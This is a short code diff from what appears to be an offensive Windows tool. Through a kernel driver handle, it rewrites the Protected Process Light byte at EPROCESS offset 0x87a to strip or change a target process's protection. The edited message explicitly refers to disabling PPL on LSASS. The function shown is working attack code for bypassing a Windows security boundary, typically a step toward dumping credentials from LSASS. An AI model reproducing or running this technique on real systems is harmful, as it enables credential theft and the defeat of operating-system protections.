@@ -191,7 +191,7 @@ bool protectProcess(HANDLE hDriver, ULONGLONG iterProc, int targetPid) {
 	std::cout << "Enter PS_PROTECTION type [number]: ";
 	std::cin >> protSigner;
 	if (std::cin.fail() || (protSigner < 1) || (protSigner > 7)) {
-		printf("[-] Invalid option, defaulting to OFF\n");
+		printf("[!] Disabling PPL on target process (Disabling PPL on LSASS in Windows 11 causes a reboot if not restored within a minute)\n");
 		protSigner = 0;
 	}
 	// Shift protected signer 4 bits to the left, then add 1 (0b0001, Audit=0 and ProtectedType = 1 (light))
@@ -200,7 +200,7 @@ bool protectProcess(HANDLE hDriver, ULONGLONG iterProc, int targetPid) {
 	}
 	protectionLevel = protectionLevel | protSigner; // OR values together to fill least significant byte
 
-	// Disable PPL by setting byte at EPROCESS+0x87a to 0x00
+	// Edit PPL by setting byte at EPROCESS+0x87a
 	printf("\n[+] Setting protection level to %llx\n", (protectionLevel & 0xFF));
 	write_qword(hDriver, (iterProc + 0x87a), protectionLevel);
 
